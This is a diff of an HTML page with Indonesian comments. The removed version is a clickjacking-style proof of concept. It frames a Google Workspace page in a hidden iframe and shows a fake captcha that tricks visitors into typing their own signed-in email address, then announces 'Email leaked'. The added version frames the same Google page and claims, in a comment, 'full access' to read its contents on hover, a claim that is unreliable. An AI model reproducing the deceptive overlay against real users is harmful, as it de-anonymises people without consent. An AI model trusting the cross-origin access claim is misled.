@@ -1,70 +1,33 @@
-<meta name="referrer" content="no-referrer" />
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>1websaya.com - Node.js Proxy</title>
+</head>
+<body>
 
-<iframe
-    width="500px"
-    height="500px"
-    frameborder="0"
-    style="position: fixed; top:-15px; display:none;"
-    onload="load()"
-    src="https://access.workspace.google.com/u/0/ServiceNotAllowed?application=216932279217&source=scrip&continue=https://chat.google.com/?authuser%3D1&pli=1">
-</iframe>
+    <h3>Hasil Hover:</h3>
+    <textarea id="hasil" style="width:100%; height:100px;"></textarea>
 
-<div
-    style="position:fixed;top:0px;z-index:100;border-style:groove;border-color:red;border-width:5px;display:none;">
-    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-</div>
+    <h3>Iframe Web Kuliah</h3>
+    <!-- Iframe memanggil proxy Node.js milik kita -->
+    <iframe id="myIframe" src="https://access.workspace.google.com/u/0/ServiceNotAllowed?application=216932279217&source=scrip&continue=https://chat.google.com" style="width:100%; height:500px;"></iframe>
 
-<div style="position:fixed;top:30px;z-index:100;background-color:grey;">
+    <script>
+        const iframe = document.getElementById('myIframe');
+        const hasil = document.getElementById('hasil');
 
-    <h3>Loading...</h3>
+        iframe.onload = function() {
+            // Kita punya akses penuh ke dalam iframe sekarang!
+            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
 
-    <b></b><br>
-
-    <textarea id="answer"></textarea>
-
-    <br><br><br>
-
-</div>
-
-<script>
-function load() {
-    document.querySelector('h3').textContent =
-        'Solve the following problem to access the page.';
-
-    document.querySelector('iframe').style =
-        'position:fixed;top:-15px;display:block;';
-
-    document.querySelector('div').style.display = 'block';
-
-    document.querySelector('b').textContent =
-        'Type letters inside the redbox to below textbox:';
-
-    const text = document.querySelector('#answer');
-
-    // Event ketika isi textarea berubah
-    text.addEventListener('input', () => {
-        if (text.value.includes('@gma')) {
-            alert(`Email leaked:\n${text.value}`);
-        } else {
-            alert('Wrong letters. Try again!');
-        }
-    });
-
-    // DOUBLE-CLICK → COPY ISI TEXTAREA
-    text.addEventListener('dblclick', async () => {
-        const value = text.value;
-
-        if (!value) {
-            return;
-        }
-
-        try {
-            await navigator.clipboard.writeText(value);
-
-            console.log('Berhasil dicopy:', value);
-        } catch (error) {
-            console.error('Gagal copy:', error);
-        }
-    });
-}
-</script>
+            iframeDoc.addEventListener('mouseover', function(e) {
+                let teks = e.target.innerText;
+                if (teks && teks.trim() !== '') {
+                    hasil.value = teks; // Teks otomatis masuk ke textarea saat hover
+                }
+            });
+        };
+    </script>
+</body>
+</html>
